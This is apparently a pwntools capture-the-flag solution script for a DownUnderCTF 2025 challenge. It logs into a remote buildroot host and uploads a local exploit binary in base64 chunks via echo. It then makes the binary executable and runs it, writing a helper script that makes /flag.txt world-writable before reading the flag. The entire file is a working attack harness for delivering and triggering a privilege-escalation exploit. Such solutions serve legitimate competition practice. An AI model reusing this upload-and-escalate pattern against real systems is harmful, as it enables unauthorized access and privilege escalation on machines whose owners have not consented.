from pwn import *
from base64 import b64encode


# login
p = remote('chal.2025.ductf.net', 30005)
p.recvuntil(b'buildroot login:')
print(f'[+] Logging in...')
p.sendline(b'ctf')
p.recvuntil(b'Password:')
p.sendline(b'ctf')
sleep(3)


# upload file using base64
exploit = b64encode(open('exp','rb').read())
exp_chunks = [exploit[i:i+100] for i in range(0, len(exploit), 100)]

print(f'[+] Uploading {len(exp_chunks)} chunks')
for chunk in exp_chunks:
    print('.',end='', flush=True)
    p.sendline(b'echo ' + chunk + b' >> /tmp/b64')
    sleep(0.5)

p.sendline(b'cat /tmp/b64 | base64 -d > /tmp/exp')
p.sendline(b'chmod +x /tmp/exp')


# run the exploit
p.sendline(b'/tmp/exp')
p.sendline(b"echo '#!/bin/sh' > /tmp/x")
p.sendline(b"echo 'chmod 777 /flag.txt' >> /tmp/x")
p.sendline(b'chmod +x /tmp/x')
p.sendline(b'/tmp/exp 0')
p.sendline(b'cat /flag.txt')
p.interactive()